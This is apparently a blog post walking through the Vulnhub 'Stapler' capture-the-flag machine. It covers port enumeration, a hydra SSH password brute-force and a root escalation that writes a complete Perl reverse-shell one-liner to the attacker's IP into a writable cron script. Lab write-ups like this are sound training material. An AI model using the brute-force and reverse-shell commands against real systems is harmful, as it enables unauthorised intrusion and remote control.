@@ -1,0 +1,249 @@
+---
+layout: "post"
+title: "Stapler"
+description: "boot-to-root walk through of Stapler
+date: "2017-07-26 19:34"
+category: CTF
+tags: [boot2root, CTF]
+---
+{% include JB/setup %}
+
+#Stapler
+
+Stapler is a boot-to-root vulnerable machine that was found on [Vulnhub](https://www.vulnhub.com/entry/stapler-1,150/). The machine was not super difficult, however it does certainly reward enumeration. This is certainly not surprising given that the machine was created by g0tmi1k.
+
+This is by no means the only correct way to pass this machine and gain root access, it is just the way I found to do it.
+
+First, start with nmap:
+
+`nmap -p- 192.168.1.116`
+
+```
+ports open: PORT STATE SERVICE
+21/tcp open ftp
+22/tcp open ssh
+53/tcp open domain
+80/tcp open http
+139/tcp open netbios-ssn
+666/tcp open doom
+3306/tcp open mysql
+12380/tcp open unknown
+```
+This returns a list of open ports that can be used to further enumerate each service.
+
+**Port 21:**
+
+Connecting to FTP we are presented a message:
+```
+220-
+220-|-----------------------------------------------------------------------------------------|
+220-| Harry, make sure to update the banner when you get a chance to show who has access here |
+220-|-----------------------------------------------------------------------------------------|
+220-
+220
+```
+![img of ftp output](/assets/images/stapler/image.png)
+
+We are able to login anonymously and find that there is a file available for download.
+
+![img of ftp output](/assets/images/stapler/image2.png)
+
+Download the note and read it:
+Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.
+
+![img of ftp output](/assets/images/stapler/image3.png)
+
+Using nmap to get the version of FTP: vsftpd 2.0.8 or later
+
+![img of ftp output](/assets/images/stapler/image13.png)
+
+**Port 22:**
+
+When using ssh to connect to the box, we see another message:
+
+```
+-----------------------------------------------------------------
+~ Barry, don't forget to put a message here ~
+-----------------------------------------------------------------
+```
+using netcat, we can see that the ssh version is: SSH-2.0-OpenSSH_7.2p2 Ubuntu-4
+
+**Port 139:**
+
+enum4linux reveals quite a bit of information for this server, including a list of valid users and 2 mount points.
+
+```
+# enum4linux 192.168.1.116
+Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Jul 16 11:36:25 2017
+==========================
+| Target Information     |
+==========================
+Target ........... 192.168.1.116
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+==========================================
+| Share Enumeration on 192.168.1.116     |
+==========================================
+WARNING: The "syslog" option is deprecated
+Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]
+
+Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.9-Ubuntu]
+Sharename Type Comment
+--------- ---- -------
+print$    Disk  Printer Drivers
+kathy     Disk  Fred, What are we doing here?
+tmp       Disk  All temporary files should be stored here
+IPC$      IPC   IPC Service (red server (Samba, Ubuntu))
+
+
+Server    Comment
+--------- -------
+LINKSYS01751 Samba 3.0.28a
+RED        red server (Samba, Ubuntu)
+
+Workgroup  Master
+---------  --------
+WORKGROUP LINKSYS01751
+
+[+] Attempting to map shares on 192.168.1.116
+//192.168.1.116/print$ Mapping: DENIED, Listing: N/A
+//192.168.1.116/kathy Mapping: OK, Listing: OK
+//192.168.1.116/tmp Mapping: OK, Listing: OK
+//192.168.1.116/IPC$ Mapping: OK Listing: DENIED
+
+...
+
+S-1-22-1-1000 Unix User\peter (Local User)
+S-1-22-1-1001 Unix User\RNunemaker (Local User)
+S-1-22-1-1002 Unix User\ETollefson (Local User)
+S-1-22-1-1003 Unix User\DSwanger (Local User)
+S-1-22-1-1004 Unix User\AParnell (Local User)
+S-1-22-1-1005 Unix User\SHayslett (Local User)
+S-1-22-1-1006 Unix User\MBassin (Local User)
+S-1-22-1-1007 Unix User\JBare (Local User)
+S-1-22-1-1008 Unix User\LSolum (Local User)
+S-1-22-1-1009 Unix User\IChadwick (Local User)
+S-1-22-1-1010 Unix User\MFrei (Local User)
+S-1-22-1-1011 Unix User\SStroud (Local User)
+S-1-22-1-1012 Unix User\CCeaser (Local User)
+S-1-22-1-1013 Unix User\JKanode (Local User)
+S-1-22-1-1014 Unix User\CJoo (Local User)
+S-1-22-1-1015 Unix User\Eeth (Local User)
+S-1-22-1-1016 Unix User\LSolum2 (Local User)
+S-1-22-1-1017 Unix User\JLipps (Local User)
+S-1-22-1-1018 Unix User\jamie (Local User)
+S-1-22-1-1019 Unix User\Sam (Local User)
+S-1-22-1-1020 Unix User\Drew (Local User)
+S-1-22-1-1022 Unix User\SHAY (Local User)
+S-1-22-1-1023 Unix User\Taylor (Local User)
+S-1-22-1-1024 Unix User\mel (Local User)
+S-1-22-1-1025 Unix User\kai (Local User)
+S-1-22-1-1026 Unix User\zoe (Local User)
+S-1-22-1-1027 Unix User\NATHAN (Local User)
+S-1-22-1-1028 Unix User\www (Local User)
+S-1-22-1-1029 Unix User\elly (Local User)
+```
+**Port 666:**
+Using netcat to connect to port 666 we see a bunch of gibberish.
+
+![image of gibberish](/assets/images/stapler/image4.png)
+
+If we capture this gibberish out to a file,
+![image of gibberish](/assets/images/stapler/image5.png)
+We see that it's a zip file.
+
+![img message2.jpg](/assets/images/stapler/image6.png)
+This contains an interesting file message2.jpg.
+
+**Port 3306:**
+
+I don't have a valid username or password for mysql, but I was able to find the mysql version using netcat.
+
+5.7.12-0ubuntu1
+![img mysql version](/assets/images/stapler/image7.png)
+
+**Port 12380:**
+
+Using curl, I looked at http and https for this port to find that https was a bit more promising.
+
+![img curl 12380](/assets/images/stapler/image8.png)
+
+![img curl 12380 https](/assets/images/stapler/image9.png)
+
+![img browser 12380 https](/assets/images/stapler/image10.png)
+
+I ran gobuster to enumerate directories using a wordlist and found some interesting directories.
+
+![gobuster](/assets/images/stapler/image11.png)
+
+In announcements, there is a message that could lead to more information, but not super helpful to us right now.
+
+![announcements](/assets/images/stapler/image12.png)
+
+phpmyadmin exposed is dangerous, however, since I still don't have credentials to login there, I will leave this for a bit later.
+
+![announcements](/assets/images/stapler/image20.png)
+
+Looking at https://192.168.1.116:12380/phpmyadmin/doc/html/index.html I was able to determine the current version of phpmyadmin to be 4.5.4.1.
+
+## Inventory
+After enumerating all the ports, let's take an inventory of what we have.
+
+**Running software:**
+
+- Apache 2.4.18
+- Ubuntu
+- mysql 5.7.12-0ubuntu1
+- vsftpd 2.0.8
+- A list of users and some mount points.
+
+Connecting to the mount points didn't reveal anything interesting so I decided to take the users I'd collected and use hydra to brute force some passwords.
+
+## Bruteforce
+
+`hydra -L users.txt -P /usr/share/SecLists/Passwords/500-worst-passwords.txt 192.168.1.116 ssh`
+
+![Bruteforce](/assets/images/stapler/image14.png)
+
+Now I have 3 accounts that I can use to ssh to the box.
+- JBare: cookie
+- MFrei: letmein
+- Drew: qwerty
+
+![access through ssh](/assets/images/stapler/image15.png)
+Using the password (cookie) from above I was able to ssh to the machine.
+
+
+I then started with the enumeration steps on the box itself. https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+
+`ls -lart /etc/cron.d/*`
+
+logrotate looked interesting as it calls to a script using the root user.
+![logrotate](/assets/images/stapler/image16.png)
+
+`ls -l /usr/local/sbin/cron-logrotate.sh`
+
+`cat /usr/local/sbin/cron-logrotate.sh`
+
+![logrotate](/assets/images/stapler/image17.png)
+
+Seeing that I had permissions to write to a script that is run by the root user every 5 minutes got me super excited!
+
+I added a reverse shell using perl to this script:
+
+`perl -e 'use Socket;$i="192.168.1.124";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))) {open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`
+
+![reverse shell in script](/assets/images/stapler/image18.png)
+
+All that was left was to create a netcat listener on my attacking machine to listen for the reverse shell :-)
+
+![reverse shell connects](/assets/images/stapler/image19.png)
+
+**BOOM!**
+
+That's root
+
+In the end there are quite a few more messages left around the system including some in the ssl certificate and the message2.jpg file (using strings to display this). Thank you g0tmi1k for the great boot2root VM.
